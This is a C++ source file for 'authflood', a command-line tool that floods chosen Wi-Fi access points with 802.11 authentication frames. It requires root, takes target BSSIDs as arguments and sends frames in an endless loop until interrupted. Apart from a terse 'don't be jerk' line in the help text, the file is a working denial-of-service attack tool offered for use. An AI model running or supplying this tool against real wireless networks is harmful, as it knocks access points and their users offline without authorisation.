//
//  main.cpp
//  authflood
//
//  Created by BlueCocoa on 2017/5/19.
//  Copyright © 2017 BlueCocoa. All rights reserved.
//

#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/signal.h>
#include <unistd.h>
#include <atomic>
#include <condition_variable>
#include <iostream>
#include <vector>
#include <thread>
#include "WirelessKit.hpp"

using namespace std;
using namespace WirelessKit;

#ifndef DEFAULT_WLAN
    #if defined(__APPLE__)
        #define DEFAULT_WLAN "en0"
    #elif defined(__RASPBIAN__)
        #define DEFAULT_WLAN "wlan0"
    #else
        #warning You can set a default interface for you platform at compile time by `DEFAULT_WLAN=ifname make all'
    #endif
#endif

const struct option options[] = {
    { "ifname", optional_argument, NULL, 'i' },
    { "bssid",  optional_argument, NULL, 's' },
    { "help",   no_argument,       NULL, 'h' },
};

void quit(int);

atomic_bool working;
atomic_bool flood_done;
condition_variable cond;
vector<AuthFloodFrame> APs;

int main(int argc, const char * argv[]) {
    if (getuid()) {
        fprintf(stderr, "This tool requires root privileges\n");
        exit(EXIT_FAILURE);
    }
    
    Interface ifname(DEFAULT_WLAN);
    
    int arg, argslot;
    while (argslot = -1, (arg = getopt_long(argc, (char * const *)argv, "b:i:hs:", options, &argslot)) != -1) {
        switch (arg) {
            case 'b' : {
                MAC aBSSID(optarg);
                if (aBSSID.is_valid()) APs.emplace_back(AuthFloodFrame(AP(aBSSID)));
                break;
            }
            case 'i' : {
                ifname = Interface(optarg);
                break;
            }
            case 'h' : {
                fprintf(stdout, "%s [-i|--ifname " DEFAULT_WLAN "] [-b|--bssid BB:BB:BB:BB:BB:BB]\nUse at your own risk & don't be jerk!\n", argv[0]);
                return 0;
            }
        }
    }
    
#if defined(__RASPBIAN__)
    pcap_t * pcap_handle = NULL;
    char pcap_error[PCAP_ERRBUF_SIZE];
    pcap_handle = pcap_open_live(ifname._ifname.c_str(), 65536, 1, 1, pcap_error);
    pcap_set_datalink(pcap_handle, DLT_IEEE802_11_RADIO);
    pcap_set_rfmon(pcap_handle, 1);
    ifname._pcap_handle = pcap_handle;
#endif
    
    if (ifname.open() && APs.size() > 0) {
        uint64_t count = 0;
        working = true;
        flood_done = false;
        signal(SIGINT, quit);

        fprintf(stdout, "\n");
        thread flooder{[&count, &ifname]{
            while (working) {
                for (auto iter = APs.begin(); iter != APs.end(); iter++) {
                    if (!working) break;
                    AuthFloodFrame & auth = *iter;
                    auth.auth(ifname);
                    count++;
                    fprintf(stdout, "%llu Beacon packets sent\r", count);
                    fflush(stdout);
                }
                usleep(100000);
            }
            flood_done = true;
        }};
        
        mutex mtx;
        thread ([&]{
            unique_lock<mutex> lock(mtx);
            cond.wait(lock);
            working = false;
            fprintf(stdout, "\r%llu authenticate packets sent in total!\n", count);
            while (!flood_done) this_thread::yield();
            flooder.join();
        }).join();
    }
    
    return 0;
}

void quit(int) {
    working = false;
    cond.notify_one();
}
